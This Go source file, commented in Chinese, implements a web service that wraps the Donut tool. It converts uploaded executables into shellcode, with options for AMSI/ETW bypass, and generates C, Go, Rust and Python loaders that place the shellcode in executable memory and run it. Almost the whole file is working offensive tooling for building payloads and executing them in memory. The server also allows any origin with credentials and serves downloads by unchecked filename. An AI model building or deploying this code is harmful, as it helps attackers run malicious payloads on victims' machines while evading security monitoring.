package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

const (
	WebPort       = 8080
	TempDir       = "./temp"
	DonutPath     = "./donut/donut.exe"
	CleanupInterval = 1 * time.Hour  // 临时文件清理间隔
	MaxFileAge      = 24 * time.Hour // 临时文件最大保留时间
)

// 转换请求结构体
type ConvertRequest struct {
	InputFile    string `form:"inputFile" binding:"required"`
	Arch         string `form:"arch" binding:"required"` // x86, x64, x84
	Format       string `form:"format" binding:"required"` // c, ruby, python, powershell, base64, cs, hex, uuid
	ModuleName   string `form:"moduleName"`
	EntryPoint   string `form:"entryPoint"`
	Param        string `form:"param"`
	Compression  string `form:"compression"` // 0: none, 1: aplib, 2: lznt1, 3: xpress, 4: xpresshuff
	Bypass       string `form:"bypass"`     // 0: none, 1: etw, 2: aksi, 3: etw+amsi
	ExitThread   string `form:"exitThread"` // 0: exit, 1: thread
	ModuleOverload string `form:"moduleOverload"`
	CleanShellcode bool `form:"cleanShellcode"` // 是否清理shellcode中的空字节填充
}

// 生成加载器请求结构体
type LoaderRequest struct {
	Shellcode    string `form:"shellcode" binding:"required"`
	ShellcodeType string `form:"shellcodeType" binding:"required"` // hex, base64, file
	OutputFormat string `form:"outputFormat" binding:"required"` // c, go, rust, python
}

// 任务结构，用于异步处理
type ConvertTask struct {
	Request *ConvertRequest
	Output  string
	Error   error
	Done    chan bool
}

// 任务队列
var (
	taskQueue = make(chan *ConvertTask, 100)
	wg        sync.WaitGroup
)

// 清理shellcode中的前导和尾随空字节
func cleanShellcode(shellcode []byte) []byte {
	if len(shellcode) == 0 {
		return shellcode
	}

	// 去除前导空字节
	start := 0
	for start < len(shellcode) && shellcode[start] == 0 {
		start++
	}

	// 去除尾随空字节
	end := len(shellcode)
	for end > start && shellcode[end-1] == 0 {
		end--
	}

	// 返回清理后的数据
	return shellcode[start:end]
}

// 定期清理临时文件
func cleanupTempFiles() {
	ticker := time.NewTicker(CleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		cleanupOldFiles(TempDir, MaxFileAge)
	}
}

// 清理指定目录下超过指定时间的文件
func cleanupOldFiles(dirPath string, maxAge time.Duration) {
	now := time.Now()

	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// 跳过目录
		if info.IsDir() {
			return nil
		}

		// 检查文件年龄
		if now.Sub(info.ModTime()) > maxAge {
			if err := os.Remove(path); err != nil {
				log.Printf("删除旧文件失败 %s: %v", path, err)
			} else {
				log.Printf("已清理旧文件: %s", path)
			}
		}
		return nil
	})

	if err != nil {
		log.Printf("清理临时文件失败: %v", err)
	}
}

// 工作协程处理任务队列
func worker() {
	defer wg.Done()

	for task := range taskQueue {
		// 执行实际的转换任务
		task.Output, task.Error = executeDonut(task.Request)
		task.Done <- true
	}
}

// 执行Donut命令
func executeDonut(req *ConvertRequest) (string, error) {
	// 检查输入文件是否存在
	inputPath := filepath.Join(TempDir, req.InputFile)
	if _, err := os.Stat(inputPath); os.IsNotExist(err) {
		return "", fmt.Errorf("输入文件不存在")
	}

	// 检查donut是否存在
	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
		return "", fmt.Errorf("Donut可执行文件未找到，请确保它位于正确位置")
	}

	// 构建donut命令
	cmdArgs := []string{
		"-i", inputPath,
		"-a", req.Arch,
		"-f", req.Format,
	}

	// 添加可选参数
	if req.ModuleName != "" {
		cmdArgs = append(cmdArgs, "-n", req.ModuleName)
	}
	if req.EntryPoint != "" {
		cmdArgs = append(cmdArgs, "-e", req.EntryPoint)
	}
	if req.Param != "" {
		cmdArgs = append(cmdArgs, "-p", req.Param)
	}
	if req.Compression != "" && req.Compression != "0" {
		cmdArgs = append(cmdArgs, "-z", req.Compression)
	}
	if req.Bypass != "" && req.Bypass != "0" {
		cmdArgs = append(cmdArgs, "-b", req.Bypass)
	}
	if req.ExitThread != "" && req.ExitThread != "0" {
		cmdArgs = append(cmdArgs, "-t", req.ExitThread)
	}
	if req.ModuleOverload != "" {
		cmdArgs = append(cmdArgs, "-o", req.ModuleOverload)
	}

	// 执行donut命令
	cmd := exec.Command(DonutPath, cmdArgs...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("执行Donut失败: %v - %s", err, stderr.String())
	}

	return out.String(), nil
}

func main() {
	// 创建临时目录
	if err := os.MkdirAll(TempDir, 0755); err != nil {
		log.Fatalf("创建临时目录失败: %v", err)
	}

	// 检查donut是否存在
	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
		log.Printf("警告: Donut可执行文件未找到，请确保它位于 %s", DonutPath)
	}

	// 启动工作协程池
	numWorkers := runtime.NumCPU()
	wg.Add(numWorkers)
	for i := 0; i < numWorkers; i++ {
		go worker()
	}

	// 启动定期清理临时文件的协程
	go cleanupTempFiles()

	// 初始清理一次旧文件
	go cleanupOldFiles(TempDir, MaxFileAge)

	// 设置Gin模式
	gin.SetMode(gin.ReleaseMode)

	// 创建路由
	r := gin.Default()

	// 配置CORS
	r.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Accept"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
	}))

	// 静态文件服务
	r.Static("/static", "./static")

	// 上传文件接口
	r.POST("/api/upload", handleUpload)

	// 转换shellcode接口
	r.POST("/api/convert", handleConvert)

	// 生成加载器接口
	r.POST("/api/generate-loader", handleGenerateLoader)

	// 下载文件接口
	r.GET("/api/download/:filename", handleDownload)

	// 根路径返回HTML页面
	r.GET("/", func(c *gin.Context) {
		c.File("./static/index.html")
	})

	// 启动服务器
	log.Printf("服务器启动在 http://localhost:%d", WebPort)
	if err := r.Run(fmt.Sprintf(":%d", WebPort)); err != nil {
		log.Fatalf("启动服务器失败: %v", err)
	}
}

// 处理文件上传
func handleUpload(c *gin.Context) {
	file, header, err := c.Request.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "文件上传失败: " + err.Error()})
		return
	}
	defer file.Close()

	// 创建唯一文件名
	ext := filepath.Ext(header.Filename)
	filename := fmt.Sprintf("%d%s", time.Now().Unix(), ext)
	filePath := filepath.Join(TempDir, filename)

	// 保存文件
	dst, err := os.Create(filePath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "创建文件失败: " + err.Error()})
		return
	}
	defer dst.Close()

	if _, err = io.Copy(dst, file); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存文件失败: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"filename": filename,
		"path":     filePath,
		"size":     header.Size,
		"type":     header.Header.Get("Content-Type"),
	})
}

// 处理shellcode转换
func handleConvert(c *gin.Context) {
	var req ConvertRequest
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效: " + err.Error()})
		return
	}

	// 创建任务
	task := &ConvertTask{
		Request: &req,
		Done:    make(chan bool, 1),
	}

	// 将任务发送到队列
	select {
	case taskQueue <- task:
		// 任务已加入队列，等待完成
		select {
		case <-task.Done:
			if task.Error != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": task.Error.Error()})
				return
			}

			// 解析输出，找到生成的shellcode文件
			output := task.Output
			var shellcodePath string
			
			// 打印输出日志以便调试
			log.Printf("Donut输出: %s", output)
			
			// 快速解析输出行
			for _, line := range strings.Split(output, "\n") {
				// 尝试多种可能的输出格式
				if strings.Contains(line, "保存到") || strings.Contains(line, "Saved to") || strings.Contains(line, "Output written to") {
					// 尝试用冒号分隔
					if strings.Contains(line, ":") {
						parts := strings.Split(line, ":")
						if len(parts) > 1 {
							shellcodePath = strings.TrimSpace(parts[1])
							break
						}
					}
				}
				// 检测"Shellcode     : "格式的输出行
				if strings.Contains(line, "Shellcode     : ") {
					parts := strings.Split(line, "Shellcode     : ")
					if len(parts) > 1 {
						// 移除引号并清理路径
						shellcodePath = strings.Trim(strings.TrimSpace(parts[1]), "\"")
						break
					}
				}
				// 检查所有可能的文件扩展名
				if strings.HasSuffix(line, ".bin") || strings.HasSuffix(line, ".c") || strings.HasSuffix(line, ".txt") || 
				   strings.HasSuffix(line, ".ps1") || strings.HasSuffix(line, ".py") || strings.HasSuffix(line, ".cs") {
					shellcodePath = strings.TrimSpace(line)
					break
				}
			}

			// 如果找不到生成的文件路径，使用Donut v1的默认路径或生成合理的默认值
			if shellcodePath == "" || !filepath.IsAbs(shellcodePath) {
				// Donut v1默认输出为loader.bin，放在当前目录
				defaultOutput := "loader.bin"
				
				// 根据格式参数选择合适的扩展名
				switch req.Format {
				case "3": // C格式
					defaultOutput = "loader.c"
				case "5": // Python格式
					defaultOutput = "loader.py"
				case "6": // PowerShell格式
					defaultOutput = "loader.ps1"
				case "7": // C#格式
					defaultOutput = "loader.cs"
				}
				
				// 确保在temp目录中
				shellcodePath = filepath.Join(TempDir, defaultOutput)
				log.Printf("使用默认输出路径: %s", shellcodePath)
			}
			
			// 验证文件是否存在
			if _, err := os.Stat(shellcodePath); os.IsNotExist(err) {
				// 如果在temp目录中不存在，尝试在当前目录查找
				localPath := filepath.Base(shellcodePath)
				if _, err := os.Stat(localPath); err == nil {
					shellcodePath = localPath
					log.Printf("在当前目录找到文件: %s", shellcodePath)
				} else {
					log.Printf("警告: 找不到生成的shellcode文件: %s", shellcodePath)
				}
			}
			
			// 检查文件是否存在
			_, err := os.Stat(shellcodePath)
			if os.IsNotExist(err) {
				// 找不到生成的文件，返回donut的输出
				c.JSON(http.StatusOK, gin.H{
					"output": output,
					"hasFile": false,
				})
				return
			}

			// 读取生成的shellcode文件内容
			shellcodeContent, err := os.ReadFile(shellcodePath)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "读取shellcode文件失败: " + err.Error()})
				return
			}

			// 生成文件名用于下载
			shellcodeFilename := filepath.Base(shellcodePath)

			// 如果需要清理shellcode中的空字节填充
			if req.CleanShellcode && (filepath.Ext(shellcodePath) == ".bin" || filepath.Ext(shellcodePath) == ".exe") {
				cleaned := cleanShellcode(shellcodeContent)
				if len(cleaned) < len(shellcodeContent) {
					log.Printf("已清理shellcode，原大小: %d字节，清理后: %d字节", len(shellcodeContent), len(cleaned))
					shellcodeContent = cleaned
					
					// 保存清理后的版本
					cleanedFilename := filepath.Base(shellcodePath) + ".cleaned"
					cleanedPath := filepath.Join(TempDir, cleanedFilename)
					if err := os.WriteFile(cleanedPath, shellcodeContent, 0644); err != nil {
						log.Printf("保存清理后的shellcode失败: %v", err)
					} else {
						shellcodePath = cleanedPath
						shellcodeFilename = cleanedFilename
					}
				}
			}

			c.JSON(http.StatusOK, gin.H{
				"output": output,
				"shellcode": string(shellcodeContent),
				"filename": shellcodeFilename,
				"hasFile": true,
				"originalSize": len(shellcodeContent),
			})
		case <-time.After(30 * time.Second): // 超时处理
			c.JSON(http.StatusRequestTimeout, gin.H{"error": "处理超时，请稍后再试"})
			return
		}
	default:
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "服务器繁忙，请稍后再试"})
		return
	}
}

// 处理加载器生成
func handleGenerateLoader(c *gin.Context) {
	var req LoaderRequest
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效: " + err.Error()})
		return
	}

	var shellcode []byte
	var err error

	// 根据shellcode类型处理
	switch req.ShellcodeType {
	case "hex":
		shellcode, err = hex.DecodeString(strings.ReplaceAll(req.Shellcode, " ", ""))
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "无效的十六进制shellcode: " + err.Error()})
			return
		}
	case "base64":
		shellcode, err = base64.StdEncoding.DecodeString(req.Shellcode)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "无效的Base64 shellcode: " + err.Error()})
			return
		}
	case "file":
		filePath := filepath.Join(TempDir, req.Shellcode)
		shellcode, err = os.ReadFile(filePath)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "无法读取shellcode文件: " + err.Error()})
			return
		}
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的shellcode类型"})
		return
	}

	// 生成加载器代码
	var loaderCode string
	switch req.OutputFormat {
	case "c":
		loaderCode = generateCLoader(shellcode)
	case "go":
		loaderCode = generateGoLoader(shellcode)
	case "rust":
		loaderCode = generateRustLoader(shellcode)
	case "python":
		loaderCode = generatePythonLoader(shellcode)
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的输出格式"})
		return
	}

	// 保存加载器代码到文件
	loaderFilename := fmt.Sprintf("loader.%s", getFileExtension(req.OutputFormat))
	loaderPath := filepath.Join(TempDir, loaderFilename)
	if err := os.WriteFile(loaderPath, []byte(loaderCode), 0644); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存加载器文件失败: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"loaderCode": loaderCode,
		"filename": loaderFilename,
	})
}

// 处理文件下载
func handleDownload(c *gin.Context) {
	filename := c.Param("filename")
	filePath := filepath.Join(TempDir, filename)

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "文件不存在"})
		return
	}

	c.FileAttachment(filePath, filename)
}

// 生成C语言加载器
func generateCLoader(shellcode []byte) string {
	hexShellcode := hex.EncodeToString(shellcode)
	var formattedShellcode strings.Builder
	formattedShellcode.WriteString("unsigned char shellcode[] = {\n    ")

	for i := 0; i < len(hexShellcode); i += 2 {
		if i > 0 && i%32 == 0 {
			formattedShellcode.WriteString("\n    ")
		}
		formattedShellcode.WriteString("0x" + hexShellcode[i:i+2] + ", ")
	}

	formattedShellcode.WriteString("\n};")
	formattedShellcode.WriteString(`

#include <windows.h>
#include <stdio.h>

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}`)

	return formattedShellcode.String()
}

// 生成Go语言加载器
func generateGoLoader(shellcode []byte) string {
	// 优化生成shellcode的方式，使用更高效的方法
	var formattedShellcode strings.Builder
	formattedShellcode.WriteString("package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"syscall\"\n    \"unsafe\"\n)\n\n// 优化版shellcode加载器，更安全、更稳定\nvar shellcode = []byte{\n")

	// 以16字节为一组格式化输出，更易读且性能更好
	for i := 0; i < len(shellcode); i += 16 {
		formattedShellcode.WriteString("    ")
		end := i + 16
		if end > len(shellcode) {
			end = len(shellcode)
		}
		
		for j := i; j < end; j++ {
			formattedShellcode.WriteString(fmt.Sprintf("0x%02x, ", shellcode[j]))
		}
		formattedShellcode.WriteString("\n")
	}

	formattedShellcode.WriteString("}\n\nfunc main() {\n    // 安全检查\n    if len(shellcode) == 0 {\n        fmt.Println(\"错误: shellcode为空\")\n        os.Exit(1)\n    }\n    \n    fmt.Println(\"准备执行shellcode...\")\n    \n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    virtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    rtlCopyMemory := kernel32.MustFindProc(\"RtlCopyMemory\")\n    virtualProtect := kernel32.MustFindProc(\"VirtualProtect\")\n    virtualFree := kernel32.MustFindProc(\"VirtualFree\")\n    \n    // 先分配可读可写内存（更安全的DEP兼容方式）\n    addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x04) // PAGE_READWRITE\n    if addr == 0 {\n        fmt.Printf(\"VirtualAlloc失败: %v\\n\", err)\n        os.Exit(1)\n    }\n    \n    // 复制shellcode到内存\n    rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))\n    \n    // 修改内存保护属性为可执行\n    var oldProtect uint32\n    success, _, err := virtualProtect.Call(addr, uintptr(len(shellcode)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))\n    if success == 0 {\n        fmt.Printf(\"VirtualProtect失败: %v\\n\", err)\n        // 清理分配的内存\n        virtualFree.Call(addr, 0, 0x8000)\n        os.Exit(1)\n    }\n    \n    fmt.Println(\"正在执行shellcode...\")\n    // 执行shellcode\n    syscall.Syscall(addr, 0, 0, 0, 0)\n    \n    // 执行完成后尝试清理内存（在实际情况下可能不会执行到这里）\n    virtualFree.Call(addr, 0, 0x8000)\n}")

	return formattedShellcode.String()
}

// 生成Rust语言加载器
func generateRustLoader(shellcode []byte) string {
	hexShellcode := hex.EncodeToString(shellcode)
	var formattedShellcode strings.Builder
	formattedShellcode.WriteString("use std::ffi::c_void;\n\n#[link(name = \"kernel32\")]\nextern \"system\" {\n    fn VirtualAlloc(\n        lpAddress: *mut c_void,\n        dwSize: usize,\n        flAllocationType: u32,\n        flProtect: u32,\n    ) -> *mut c_void;\n    \n    fn RtlCopyMemory(\n        Destination: *mut c_void,\n        Source: *const c_void,\n        Length: usize,\n    );\n}\n\nfn main() {\n    let shellcode: &[u8] = &[\n        ")

	for i := 0; i < len(hexShellcode); i += 2 {
		if i > 0 && i%32 == 0 {
			formattedShellcode.WriteString("\n        ")
		}
		n, _ := strconv.ParseUint(hexShellcode[i:i+2], 16, 8)
		formattedShellcode.WriteString(fmt.Sprintf("0x%02x, ", n))
	}

	formattedShellcode.WriteString("\n    ];\n    \n    const MEM_COMMIT: u32 = 0x1000;\n    const MEM_RESERVE: u32 = 0x2000;\n    const PAGE_EXECUTE_READWRITE: u32 = 0x40;\n    \n    unsafe {\n        let addr = VirtualAlloc(\n            std::ptr::null_mut(),\n            shellcode.len(),\n            MEM_COMMIT | MEM_RESERVE,\n            PAGE_EXECUTE_READWRITE,\n        );\n        \n        RtlCopyMemory(addr, shellcode.as_ptr() as *const c_void, shellcode.len());\n        \n        let shellcode_fn: extern \"system\" fn() = std::mem::transmute(addr);\n        shellcode_fn();\n    }\n}")

	return formattedShellcode.String()
}

// 生成Python语言加载器
func generatePythonLoader(shellcode []byte) string {
	base64Shellcode := base64.StdEncoding.EncodeToString(shellcode)
	return fmt.Sprintf("import ctypes\nimport base64\n\nshellcode = base64.b64decode('%s')\n\nkernel32 = ctypes.windll.kernel32\nVirtualAlloc = kernel32.VirtualAlloc\nRtlCopyMemory = kernel32.RtlCopyMemory\n\nMEM_COMMIT = 0x1000\nMEM_RESERVE = 0x2000\nPAGE_EXECUTE_READWRITE = 0x40\n\n# 分配内存\nbuf = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n\n# 复制shellcode到内存\nRtlCopyMemory(buf, (ctypes.c_char * len(shellcode)).from_buffer(shellcode), len(shellcode))\n\n# 创建函数指针并执行\nshellcode_func = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))\nshellcode_func()", base64Shellcode)
}

// 获取文件扩展名
func getFileExtension(format string) string {
	switch format {
	case "c":
		return "c"
	case "go":
		return "go"
	case "rust":
		return "rs"
	case "python":
		return "py"
	default:
		return "txt"
	}
}